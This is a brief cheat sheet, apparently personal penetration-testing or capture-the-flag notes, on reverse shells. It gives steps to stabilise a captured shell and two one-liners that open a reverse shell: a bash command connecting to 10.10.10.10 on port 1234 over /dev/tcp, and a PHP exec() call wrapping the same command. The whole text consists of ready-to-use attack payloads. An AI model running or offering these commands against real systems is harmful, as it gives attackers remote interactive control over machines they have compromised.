# Reverse Shell


# estabilize shell?

```
script /dev/null -c /bin/bash
CTRL + Z
stty raw -echo; fg
Then press Enter twice, and then enter:
export TERM=xterm
```




# Bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'

# PHP - Bash
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'");
